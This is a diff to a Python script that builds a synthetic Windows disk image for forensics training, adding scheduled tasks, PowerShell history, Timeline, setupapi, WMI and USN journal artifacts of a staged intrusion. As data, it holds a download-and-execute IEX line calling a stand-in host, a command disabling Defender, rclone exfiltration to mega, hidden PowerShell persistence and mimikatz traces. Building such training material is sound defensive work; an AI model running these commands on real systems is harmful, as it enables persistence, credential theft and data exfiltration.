@@ -9,10 +9,13 @@ IP addresses are documentation ranges (RFC 5737) and domains use
 
 from __future__ import annotations
 
+import base64
 import hashlib
 import json
 import os
 import random
+import sqlite3
+import struct
 from datetime import datetime, timedelta, timezone
 from pathlib import Path
 
@@ -51,6 +54,12 @@ def generate_demo(dest: Path) -> dict[str, Path]:
     _mft(c / "$MFT")
     _prefetch(c / "Windows/Prefetch")
     _usrclass(c / f"Users/{USER}/AppData/Local/Microsoft/Windows/UsrClass.dat")
+    _tasks(c / "Windows/System32/Tasks")
+    _psreadline(c / f"Users/{USER}/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt")
+    _wintimeline(c / f"Users/{USER}/AppData/Local/ConnectedDevicesPlatform/L.{USER}/ActivitiesCache.db")
+    _setupapi(c / "Windows/inf/setupapi.dev.log")
+    _wmi_repository(c / "Windows/System32/wbem/Repository/OBJECTS.DATA")
+    _usn_journal(c / "$Extend/$J")
 
     image = dest / "disk_unallocated.img"
     _disk_image(image)
@@ -83,6 +92,12 @@ def _system_hive(path: Path) -> None:
     h.value(f"{cs}\\Control\\ComputerName\\ComputerName", "ComputerName", b.REG_SZ, HOST)
     h.value(f"{cs}\\Control\\TimeZoneInformation", "TimeZoneKeyName", b.REG_SZ, "Romance Standard Time")
     h.value(f"{cs}\\Control\\TimeZoneInformation", "ActiveTimeBias", b.REG_DWORD, 0xFFFFFF88)  # -120 -> UTC+2
+    tzi = f"{cs}\\Control\\TimeZoneInformation"
+    h.value(tzi, "Bias", b.REG_DWORD, 0xFFFFFFC4)  # -60: UTC+1, daylight saving from March to October
+    h.value(tzi, "StandardBias", b.REG_DWORD, 0)
+    h.value(tzi, "DaylightBias", b.REG_DWORD, 0xFFFFFFC4)
+    h.value(tzi, "StandardStart", b.REG_BINARY, struct.pack("<8H", 0, 10, 0, 5, 3, 0, 0, 0))  # last Sun Oct 03:00
+    h.value(tzi, "DaylightStart", b.REG_BINARY, struct.pack("<8H", 0, 3, 0, 5, 2, 0, 0, 0))  # last Sun Mar 02:00
     h.value(f"{cs}\\Control\\Windows", "ShutdownTime", b.REG_BINARY, b.to_filetime(_t(300)).to_bytes(8, "little"))
     iface = f"{cs}\\Services\\Tcpip\\Parameters\\Interfaces\\{{4f2a7c10-1111-4c3e-9a55-0d1e2f3a4b5c}}"
     h.value(iface, "EnableDHCP", b.REG_DWORD, 1)
@@ -318,6 +333,16 @@ def _mft(path: Path) -> None:
     gone = ft(_t(130)) + 777
     records[72] = b.build_mft_record(72, "clientes_2026.zip", 66, si=(gone, gone, gone, gone),
                                      fn=(gone, gone, gone, gone), size=1048576, in_use=False)
+    tools = ft(_t(56.5)) + 99
+    records[73] = b.build_mft_record(73, "Tools", 65, si=(tools,) * 4, fn=(tools,) * 4, directory=True)
+    mimi = ft(_t(57)) + 501
+    records[74] = b.build_mft_record(74, "mimikatz.exe", 73, si=(mimi,) * 4, fn=(mimi,) * 4, size=1355264,
+                                     in_use=False)
+    rcl = ft(_t(119)) + 77
+    records[75] = b.build_mft_record(75, "rclone.exe", 73, si=(rcl,) * 4, fn=(rcl,) * 4, size=54278144)
+    records[76] = b.build_mft_record(76, "sync.ps1", 65, si=(rcl,) * 4, fn=(rcl,) * 4, size=2048, in_use=False)
+    records[80] = b.build_mft_record(80, "Windows", 5, si=normal, fn=normal, directory=True, parent_sequence=5)
+    records[81] = b.build_mft_record(81, "Prefetch", 80, si=normal, fn=normal, directory=True)
     path.parent.mkdir(parents=True, exist_ok=True)
     with open(path, "wb") as fh:
         for number in range(max(records) + 1):
@@ -500,3 +525,150 @@ def _memory(folder: Path) -> None:
     (folder / "README.txt").write_text(
         f"vol -r json -f {HOST}.raw windows.<plugin>  (memoria capturada / memory captured {captured:%Y-%m-%d %H:%M} "
         "UTC)\n", encoding="utf-8")
+
+
+# -- scheduled tasks, PowerShell history, Windows Timeline, setupapi, WMI, $UsnJrnl ----
+_TASK = """<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo><Date>{date}</Date><Author>{author}</Author><Description>{description}</Description><URI>{uri}</URI></RegistrationInfo>
+  <Triggers>{triggers}</Triggers>
+  <Principals><Principal id="Author"><UserId>{user}</UserId><RunLevel>{level}</RunLevel></Principal></Principals>
+  <Settings><Hidden>{hidden}</Hidden><Enabled>true</Enabled></Settings>
+  <Actions Context="Author"><Exec><Command>{command}</Command><Arguments>{arguments}</Arguments></Exec></Actions>
+</Task>
+"""
+
+
+def _tasks(folder: Path) -> None:
+    benign = folder / "Microsoft/Windows/Defrag/ScheduledDefrag"
+    benign.parent.mkdir(parents=True, exist_ok=True)
+    benign.write_bytes(_TASK.format(
+        date="2019-12-07T09:10:00", author="Microsoft Corporation", description="Optimiza las unidades locales.",
+        uri="\\Microsoft\\Windows\\Defrag\\ScheduledDefrag", user="S-1-5-18", level="HighestAvailable",
+        triggers="", hidden="false", command="%windir%\\system32\\defrag.exe", arguments="-c -h -o -$").encode("utf-16"))
+    _touch(benign, _t(-60 * 24 * 300))
+    evil = folder / "WinUpdateCheck"
+    evil.write_bytes(_TASK.format(
+        date=(_t(44) + timedelta(hours=2)).strftime("%Y-%m-%dT%H:%M:%S"), author=f"{HOST}\\{USER}",
+        description="Windows Update helper", uri="\\WinUpdateCheck", user="S-1-5-18", level="HighestAvailable",
+        triggers="<BootTrigger><Enabled>true</Enabled></BootTrigger><TimeTrigger><StartBoundary>"
+                 "2026-09-14T04:55:00</StartBoundary><Repetition><Interval>PT1H</Interval></Repetition></TimeTrigger>",
+        hidden="true", command="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        arguments="-nop -w hidden -ep bypass -file C:\\Users\\Public\\sync.ps1").encode("utf-16"))
+    _touch(evil, _t(44))
+
+
+def _psreadline(path: Path) -> None:
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_text("\n".join((
+        "Get-ChildItem C:\\Users\\maria\\Documents",
+        "cd C:\\Users\\Public",
+        "IEX (New-Object Net.WebClient).DownloadString('http://update-cdn.example/a.ps1')",
+        "Set-MpPreference -DisableRealtimeMonitoring $true",
+        "Compress-Archive -Path C:\\Users\\maria\\Documents\\finanzas -DestinationPath `",
+        "  C:\\Users\\maria\\Desktop\\clientes_2026.zip",
+        ".\\Tools\\rclone.exe copy C:\\Users\\maria\\Desktop\\clientes_2026.zip mega:backup",
+        "Get-Process",
+    )) + "\n", encoding="utf-8")
+    _touch(path, _t(121))
+
+
+def _wintimeline(path: Path) -> None:
+    path.parent.mkdir(parents=True, exist_ok=True)
+    conn = sqlite3.connect(path)
+    conn.execute("CREATE TABLE Activity (Id BLOB PRIMARY KEY, AppId TEXT, PackageIdHash TEXT, AppActivityId TEXT, "
+                 "ActivityType INT, ActivityStatus INT, ParentActivityId BLOB, Tag TEXT, \"Group\" TEXT, MatchId TEXT, "
+                 "LastModifiedTime DATETIME, ExpirationTime DATETIME, Payload BLOB, Priority INT, IsLocalOnly INT, "
+                 "PlatformDeviceId TEXT, CreatedInCloud DATETIME, StartTime DATETIME, EndTime DATETIME, "
+                 "LastModifiedOnClient DATETIME, GroupAppActivityId TEXT, ClipboardPayload TEXT, EnterpriseId TEXT, "
+                 "OriginalPayload BLOB, OriginalLastModifiedOnClient DATETIME, ETag INT)")
+    excel = '[{"application":"{6D809377-6AF0-444B-8957-A3773F02200E}\\\\Microsoft Office\\\\root\\\\Office16\\\\EXCEL.EXE",' \
+            '"platform":"windows_win32"}]'
+    powershell = '[{"application":"{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",' \
+                 '"platform":"windows_win32"}]'
+    zip7 = '[{"application":"{6D809377-6AF0-444B-8957-A3773F02200E}\\\\7-Zip\\\\7zG.exe","platform":"windows_win32"}]'
+    clip = json.dumps([{"content": base64.b64encode(b"powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi"
+                                                   b"AGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA").decode(),
+                        "formatName": "Text"}])
+    rows = [
+        (excel, 5, _t(-20), None, {"displayText": "cierre.xlsx", "appDisplayName": "Excel",
+                                   "description": "C:\\Users\\maria\\Documents\\finanzas\\cierre.xlsx"}, None),
+        (excel, 6, _t(-20), _t(-5), {"type": "UserEngaged", "activeDurationSeconds": 900}, None),
+        (powershell, 10, _t(23.5), None, {}, clip),
+        (powershell, 6, _t(24), _t(118), {"type": "UserEngaged", "activeDurationSeconds": 1260}, None),
+        (zip7, 5, _t(88), None, {"displayText": "clientes_2026.zip", "appDisplayName": "7-Zip",
+                                 "description": "C:\\Users\\maria\\Desktop\\clientes_2026.zip"}, None),
+    ]
+    for index, (app, kind, start, end, payload, clipboard) in enumerate(rows):
+        conn.execute("INSERT INTO Activity (Id, AppId, ActivityType, StartTime, EndTime, LastModifiedTime, Payload, "
+                     "ClipboardPayload, PlatformDeviceId) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
+                     (bytes([index + 1]) * 16, app, kind, int(start.timestamp()),
+                      int(end.timestamp()) if end else 0, int((end or start).timestamp()),
+                      json.dumps(payload).encode(), clipboard, "dGVzdA=="))
+    conn.commit()
+    conn.close()
+
+
+def _setupapi(path: Path) -> None:
+    path.parent.mkdir(parents=True, exist_ok=True)
+    local = _t(90) + timedelta(hours=2)  # Romance Daylight Time
+    path.write_text(
+        "[Device Install Log]\n     OS Version = 10.0.19045\n     Service Pack = 0.0\n\n"
+        ">>>  [Device Install (Hardware initiated) - SWD\\WPDBUSENUM\\_??_USBSTOR#Disk&Ven_Kingston]\n"
+        f">>>  Section start {local:%Y/%m/%d %H:%M:%S}.402\n<<<  Section end {local:%Y/%m/%d %H:%M:%S}.990\n"
+        "<<<  [Exit status: SUCCESS]\n\n"
+        ">>>  [Device Install (Hardware initiated) - USBSTOR\\Disk&Ven_Kingston&Prod_DataTraveler_3.0&Rev_PMAP"
+        "\\60A44C3FAE2BE2B0E9160123&0]\n"
+        f">>>  Section start {local:%Y/%m/%d %H:%M:%S}.123\n"
+        f"     ump: Creating Install Process: DrvInst.exe {local:%H:%M:%S}.130\n"
+        f"<<<  Section end {local:%Y/%m/%d %H:%M:%S}.880\n<<<  [Exit status: SUCCESS]\n", encoding="utf-8")
+
+
+def _wmi_repository(path: Path) -> None:
+    path.parent.mkdir(parents=True, exist_ok=True)
+    rng = random.Random(7)
+    noise = bytes(rng.randrange(256) for _ in range(8192))
+    command = (b"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -ep bypass "
+               b"-file C:\\Users\\Public\\sync.ps1")
+    query = (b"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "
+             b"'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240")
+    blob = b"".join((
+        noise[:2048],
+        b"\x00\x00NTEventLogEventConsumer\x00\x00SCM Event Log Consumer\x00\x00Service Control Manager\x00",
+        b'\x00\x00NTEventLogEventConsumer.Name="SCM Event Log Consumer"\x00\x00__EventFilter.Name="SCM Event Log Filter"',
+        noise[2048:4096],
+        b"\x00\x00CommandLineEventConsumer\x00\x00WinUpdCheck\x00\x00" + command + b"\x00\x00C:\\Windows\\Temp\x00",
+        noise[4096:6144],
+        b"\x00\x00__EventFilter\x00\x00WinUpdFilter\x00\x00" + query + b"\x00\x00root\\cimv2\x00",
+        noise[6144:7168],
+        b'\x00\x00CommandLineEventConsumer.Name="WinUpdCheck"\x00\x00__EventFilter.Name="WinUpdFilter"\x00',
+        noise[7168:],
+    ))
+    path.write_bytes(blob)
+
+
+def _usn_journal(path: Path) -> None:
+    from forense.parsers.usnjrnl import build_record
+
+    create, extend, close, delete = 0x100, 0x2, 0x80000000, 0x200
+    events = [  # (minutes, name, entry, parent, reason, attributes)
+        (56.5, "Tools", 73, 65, create, 0x10), (56.5, "Tools", 73, 65, create | close, 0x10),
+        (57, "mimikatz.exe", 74, 73, create, 0x20), (57, "mimikatz.exe", 74, 73, create | extend, 0x20),
+        (57, "mimikatz.exe", 74, 73, create | extend | close, 0x20),
+        (60, "mimikatz.exe", 74, 73, delete | close, 0x20),
+        (88, "clientes_2026.zip", 72, 66, create | extend | close, 0x20),
+        (119, "rclone.exe", 75, 73, create | extend | close, 0x20),
+        (119.5, "sync.ps1", 76, 65, create | extend | close, 0x20),
+        (130, "clientes_2026.zip", 72, 66, delete | close, 0x20),
+        (150, "sync.ps1", 76, 65, delete | close, 0x20),
+        (152, "NETSCAN.EXE-5A6B7C8D.pf", 82, 81, delete | close, 0x20),
+    ]
+    usn = 0x2F00000
+    data = bytearray(65536)  # released (sparse) part of the journal
+    for minutes, name, entry, parent, reason, attrs in events:
+        record = build_record(name, entry, parent, reason, _t(minutes), usn, attributes=attrs,
+                              parent_sequence=5 if parent == 5 else 1)
+        data += record
+        usn += len(record)
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_bytes(bytes(data))
